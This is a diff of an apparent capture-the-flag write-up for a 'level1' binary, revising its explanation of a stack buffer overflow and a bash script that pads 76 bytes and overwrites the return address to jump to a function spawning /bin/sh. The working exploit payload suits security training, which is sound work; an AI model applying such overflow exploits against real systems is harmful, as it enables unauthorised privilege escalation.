@@ -24,13 +24,17 @@ Dump of assembler code for function main:
    0x08048496 <+22>:    c3                ret
 End of assembler dump.
 ```
-This is a typical case of stack-buffer overflow. This means we can overwrite data preceding the buffer on the stack, notably the return pointer preceding the buffer on the stack.
 
+The stack looks like this:
 | Address | Type          | Size |
 |---------|---------------|------|
-| 0       | char data[72] | 72   |
-| 72      | *EBP          | 4    |
-| 76      | *EIP          | 4    |
+| -72     | char data[72] | 72   |
+|   0     | *EBP          |  4   |
+|  +4     | *EIP          |  4   |
+
+### Exploitation
+
+This is a typical case of stack-buffer overflow. This means we can overwrite data preceding the buffer on the stack, notably the return pointer preceding the buffer on the stack.
 
 So let's see if we can exploit an existing function in the executable.
 
@@ -82,29 +86,29 @@ We can see that there already is all we need to gain the level2 user's privilege
 0x8048584:	 "/bin/sh"
 ```
 
-All that is left to do is to craft an input string long enough to overflow the data array, and the base pointer `EBP` to be able to overwrite the return pointer `EIP`.
+All that is left to do is to craft an input string long enough to overflow the data array, and the base-pointer's value `*EBP` to be able to overwrite the return-pointer's value `*EIP`.
 
-```bash
->> shellcode.sh cat << EOF
+```sh
+> /tmp/level1.sh cat << EOF
 ```
 ```bash
 #!/usr/bin/env bash
-PADDING=A # Fill the array and EBP values with 0x41
 PADDING_LEN=76 # sizeof(data) + sizeof(*EBP)
 
 RETURN_ADDRESS='08048444' # The address of the run function
 
-printf "%.0s$PADDING" $(seq -s' ' "$PADDING_LEN")
-<<< "$RETURN_ADDRESS" rev | dd conv=swab | xxd -r -p 
-echo
+PADDING=$(printf "%.0sA" $(seq -s' ' "$PADDING_LEN"))
+BYTES=$(<<< "$RETURN_ADDRESS" rev | dd conv=swab | xxd -r -p)
+
+echo "$PADDING$BYTES"
 ```
-```bash
+```sh
 EOF
-chmod +x shellcode.sh
+chmod +x /tmp/level1.sh
 ```
 
 ```sh
-bash shellcode.sh | ./level1
+(/tmp/level1.sh; cat) | ./level1
 ```
 ```
 Good... Wait what?
